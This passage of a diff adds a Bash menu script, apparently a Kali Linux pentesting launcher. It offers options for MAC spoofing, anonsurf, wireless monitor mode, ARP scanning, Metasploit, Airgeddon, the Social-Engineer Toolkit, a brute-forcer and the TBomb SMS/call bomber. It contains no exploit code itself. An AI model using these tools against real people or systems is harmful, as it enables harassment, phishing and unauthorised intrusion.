+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_cupp
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "2" ]]
+	then
+		if [[ -f "/usr/bin/bleachbit" ]]
+		then
+			bleachbit		
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_bleachbit
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "3" ]]
+	then
+		if [[ -d "/root/TBomb" ]]
+		then
+			cd /root/TBomb
+			bash TBomb.sh	
+			echo -e "$PAKTGB"
+			$READAK	
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_tbomb
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "back" || "$OTHERT" = "b" ]]
+	then
+		tools_menu
+	elif [[ "$OTHERT" = 0 ]]
+	then
+		MainMenu
+	fi
+done
+}
+
+function MainMenu
+{
+    clear
+    
+    banner
+    read -p "Enter an Option: " choice
+    
+    if [[ $choice == "" ]]; then
+        MainMenu
+    elif [[ $choice == "if" ]]; then
+        IP_func
+        MainMenu
+    elif [[ $choice == "l" ]]; then
+        local_ips
+		echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "1" ]]; then
+        enable_wlan
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "2" ]]; then
+        enable_wlanmon
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "3" ]]; then
+        change_mac
+        echo -e "$PAKTC"
+        $READAK
+		MainMenu
+    elif [[ $choice == "4" ]]; then
+        anonsurf_start
+     	echo -e "$PAKTC"
+        $READAK
+		MainMenu
+    elif [[ $choice == "5" ]]; then
+        anonsurf_status
+        echo -e "$PAKTC"
+        $READAK
+		MainMenu
+    elif [[ $choice == "6" ]]; then
+        public_ip
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "7" ]]; then
+        view_mac
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "8" ]]; then
+        tools_menu
+        MainMenu
+    elif [[ $choice == "10" ]]; then
+    	if [[ -d "/root/pimpmykali" ]]
+		then
+			cd /root/pimpmykali
+			./pimpmykali.sh	
+			echo -e "$PAKTGB"
+			$READAK	
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_pimpmykali
+			else
+				continue
+			fi
+		fi
+	elif [[ $choice == "set" ]]; then
+		if [[ -f "/usr/bin/setoolkit" ]]
+		then
+			setoolkit	
+			echo -e "$PAKTGB"
+			$READAK
+			MainMenu	
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_setoolkit
+				MainMenu
+			else
+				continue
+			fi
+		fi
+		#setoolkit
+    elif [[ $choice == "d1" ]]; then
+        disable_wlan
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "d2" ]]; then
+        disable_wlanmon
+        echo -e "$PAKTC"
+        $READAK
+		MainMenu
+    elif [[ $choice == "d3" ]]; then
+        orginal_mac
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "d4" ]]; then
+        anonsurf_stop
+        echo -e "$PAKTC"
+		$READAK
+		MainMenu
+    elif [[ $choice == "d5" ]]; then
+        anonsurf_restart        
+        echo -e "$PAKTC"
+        $READAK
+		MainMenu
+    elif [[ $choice == "scan" ]]; then
+    	clear
+    	arp_scan
+    elif [[ $choice == "start" ]]; then
+    	start_menu
+    	echo -e "$PAKTC"
+	 	$READAK
+	 	MainMenu
+    elif [[ $choice == "stop" ]]; then
+    	stop_monitor
+    	echo -e "$PAKTC"
+	 	$READAK
+	 	MainMenu
+    elif [[ "$choice" == "0" ]]; then
+    	clear
+    	exit
+    elif [[ $choice == "9" ]]; then
+    	metasploit_menu
+    elif [[ $choice == "wifi" ]]; then
+		airgeddonn
+		MainMenu
+    elif [[ "$choice" == "hash" || "$choice" = "h" ]]; then
+    	hash_identifier
+    	echo -e "$PAKTC"
+		$READAK
+    	MainMenu
+    elif [[ "$choice" == "steg" || "$choice" = "s" ]]; then
+    	stegano
+    	echo -e "$PAKTC"
+		$READAK
+    	MainMenu
+    elif [[ "$choice" == "recon" ]]; then
+    	recon
+    	MainMenu
+    elif [[ "$choice" == "ci"  ]]; then
+    	echo ""
+    	ciphers
+    	echo -e "$PAKTC"
+		$READAK
+    	MainMenu
+    elif [[ "$choice" == "brute" ]]; then
+    	clear
+    	figlet -f slant "BRUTEY" 
+    	./bruter
+    	echo -e "$PAKTC"
+		$READAK
+    	MainMenu
+    fi
+}
+# Interface Settings
+#set_interface_number
+MainMenu
+
+
+
+
+
+
+#interface_menu
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
